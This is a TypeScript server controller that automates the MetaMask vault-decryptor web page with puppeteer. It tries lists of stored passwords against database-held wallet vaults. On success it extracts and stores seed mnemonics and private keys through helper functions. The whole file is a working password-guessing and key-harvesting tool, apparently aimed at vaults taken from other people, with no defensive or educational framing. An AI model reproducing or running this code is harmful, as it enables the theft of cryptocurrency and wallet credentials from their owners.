import Vault from "../models/vault";
import Password from "../models/pwd";
import { addSeed } from "../utils/sd";
import { addPK } from "../utils/pk";
import puppeteer from "puppeteer";

let page: any;

const runBrowser = async () => {
  const browser = await puppeteer.launch({ headless: "new" });
  const page = await browser.newPage();
  await page.goto("https://metamask.github.io/vault-decryptor/");
  return page;
};

(async () => {
  page = await runBrowser();
})();

const query = async (vault_data, password, addr) => {
  await page.click("input#radio-textinput");
  await page.evaluate(() => (document.querySelector("textarea").value = ""));
  await page.evaluate(
    () =>
      (document.querySelector<HTMLInputElement>("input.password").value = "")
  );
  await page.type("textarea", vault_data);
  await page.type("input.password", password);

  await page.click("button");
  await new Promise((r) => setTimeout(r, 100));

  const invalidPassword = await page.$("div.error");
  if (invalidPassword) {
    return "Invalid password";
  }

  let result = await page.evaluate(() => {
    return document.querySelector(".content div div div").textContent;
  });

  result = JSON.parse(result);

  for (let item of result) {
    if (item.type == "HD Key Tree") {
      await addSeed({
        seed: item.data.mnemonic,
        addr,
        numberOfAccounts: item.data.numberOfAccounts,
      });
    }
    if (item.type == "Simple Key Pair") {
      for (let key of item.data) addPK({ pk: key, addr });
    }
    if (item.type == "Ledger Hardware") {
      if (item.data?.accounts?.length) {
        console.log("---------------------- Hip Hip Hurray!!!!!!!!!!!!!");
      }
    }
  }
  return "Success";
};

class Controller {
  constructor() {}

  static async show(req: any, res: any) {
    try {
      const vault = await Vault.findById(req.body.id);
      const result = await Password.find({ addr: vault.addr })
        .skip((req.body.page - 1) * 10)
        .limit(10);
      const totalCnt = await Password.countDocuments({ addr: vault.addr });
      return res.json({ result, totalCnt });
    } catch (err) {
      return res.json({ error: err });
    }
  }

  static async auto(req: any, res: any) {
    try {
      const vault = await Vault.findById(req.body.id);
      const result = await Password.find({ addr: vault.addr })
        .skip((req.body.page - 1) * 10)
        .limit(10);
      for (const item of result) {
        const result = await query(vault.vault, item.string, vault.addr);
        if (result === "Success") {
          if (result == "Success") {
            vault.status = true;
            vault.save();
          }
          return res.json({ result });
        }
      }
      return res.json({ result: "All Failed" });
    } catch (err) {
      return res.json({ error: err });
    }
  }

  static async manual(req: any, res: any) {
    try {
      const vault = await Vault.findById(req.body.id);
      const result = await query(vault.vault, req.body.password, vault.addr);
      if (result == "Success") {
        vault.status = true;
        vault.save();
      }
      return res.json({ result });
    } catch (err) {
      return res.json({ error: err });
    }
  }
}

export default Controller;
